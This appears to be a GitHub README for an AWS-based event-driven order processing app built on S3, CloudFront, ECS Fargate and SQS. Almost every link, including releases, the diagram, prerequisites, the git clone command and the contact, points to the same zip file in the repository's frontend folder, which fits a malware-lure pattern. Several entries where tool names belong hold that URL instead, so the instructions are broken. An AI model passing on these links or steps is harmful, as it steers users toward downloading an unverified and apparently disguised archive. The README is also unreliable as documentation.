# Event-Driven Order App 🚀

![Event-Driven Order App](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip%20Order%20App-Ready%20for%20Use-brightgreen)

Welcome to the **Event-Driven Order App** repository! This project showcases an event-driven order processing system built with AWS. It features a static frontend hosted on S3 and CloudFront, an API microservice running on ECS Fargate with an Application Load Balancer, and a background worker utilizing SQS and ECS Fargate. 

For the latest updates and releases, visit our [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip) section.

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Technologies Used](#technologies-used)
4. [Getting Started](#getting-started)
5. [Deployment](#deployment)
6. [Usage](#usage)
7. [Contributing](#contributing)
8. [License](#license)
9. [Contact](#contact)

## Overview

The **Event-Driven Order App** is designed to handle order processing efficiently and reliably. By utilizing AWS services, this application can scale seamlessly to meet varying demand levels. The architecture is modular, making it easy to maintain and expand.

### Key Features

- **Scalability**: Automatically adjusts to traffic spikes.
- **Resilience**: Built to handle failures gracefully.
- **Event-Driven**: Responds to events in real-time, ensuring timely processing.
- **Microservices Architecture**: Each component is independently deployable.

## Architecture

The architecture of the Event-Driven Order App consists of several key components:

- **Frontend**: A static web application hosted on S3, delivered via CloudFront for fast content delivery.
- **API Microservice**: Deployed on ECS Fargate, this service handles incoming requests and interacts with the database.
- **Background Worker**: Processes tasks from SQS, ensuring that order fulfillment is handled asynchronously.

![Architecture Diagram](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip)

## Technologies Used

This project leverages various AWS services and technologies:

- **AWS S3**: For static file storage.
- **AWS CloudFront**: For content delivery.
- **AWS ECS**: For container orchestration.
- **AWS Fargate**: For serverless container management.
- **AWS SQS**: For message queuing.
- **https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip**: For backend development.
- **Microservices**: To ensure modularity and maintainability.

## Getting Started

To get started with the Event-Driven Order App, follow these steps:

### Prerequisites

- An AWS account
- AWS CLI installed and configured
- https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip and npm installed

### Clone the Repository

First, clone the repository to your local machine:

```bash
git clone https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip
cd event-driven-order-app
```

### Install Dependencies

Navigate to the backend directory and install the necessary dependencies:

```bash
cd backend
npm install
```

## Deployment

Deploying the Event-Driven Order App involves several steps:

1. **Set up AWS Services**: Create the necessary resources in AWS, including S3, CloudFront, ECS, and SQS.
2. **Build and Push Docker Images**: Build the Docker images for the API and background worker, then push them to Amazon ECR.
3. **Configure ECS Services**: Set up ECS services for the API and background worker.
4. **Deploy Frontend**: Upload the static files to S3 and configure CloudFront.

For detailed deployment instructions, check the [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip) section.

## Usage

Once deployed, you can interact with the Event-Driven Order App through the frontend. The frontend allows users to place orders, which are processed by the backend services.

### Frontend

Access the frontend via the CloudFront URL. Users can browse products, add them to their cart, and place orders.

### API Endpoints

The API provides several endpoints for order processing:

- `POST /api/orders`: Create a new order.
- `GET /api/orders/:id`: Retrieve order details.
- `GET /api/orders`: List all orders.

Refer to the API documentation for more details on usage.

## Contributing

We welcome contributions to the Event-Driven Order App! If you have ideas for improvements or new features, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature.
3. Make your changes and commit them.
4. Push your branch to your fork.
5. Open a pull request.

Please ensure your code follows our coding standards and is well-documented.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or support, please contact:

- **Massimo Hachem**: [https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip)

Thank you for checking out the Event-Driven Order App! For the latest updates, visit our [Releases](https://github.com/Massimo-Hachem/event-driven-order-app/raw/refs/heads/master/frontend/app_driven_event_order_1.2.zip) section.